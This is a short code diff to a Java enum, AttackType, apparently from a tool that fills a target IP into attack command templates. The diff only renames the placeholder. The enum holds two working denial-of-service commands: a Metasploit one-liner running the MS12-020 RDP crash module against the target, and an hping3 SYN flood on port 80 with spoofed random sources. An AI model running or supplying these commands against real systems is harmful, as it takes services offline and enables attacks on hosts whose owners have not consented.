@@ -4,10 +4,10 @@ import java.util.List;
 
 public enum AttackType {
     // 中断
-    ZHONGDUAN(1, "msfconsole -q -x \"use auxiliary/dos/windows/rdp/ms12_020_maxchannelids; set RHOSTS ${IP}; run; exit\""),
+    ZHONGDUAN(1, "msfconsole -q -x \"use auxiliary/dos/windows/rdp/ms12_020_maxchannelids; set RHOSTS ${ip}; run; exit\""),
 
     // 降效
-    JIANGXIAO(2, "hping3 -q -n --rand-source -S -p 80 --flood ${IP}"),
+    JIANGXIAO(2, "hping3 -q -n --rand-source -S -p 80 --flood ${ip}"),
 
     // 嗅探
     XIUTAN(3, "");
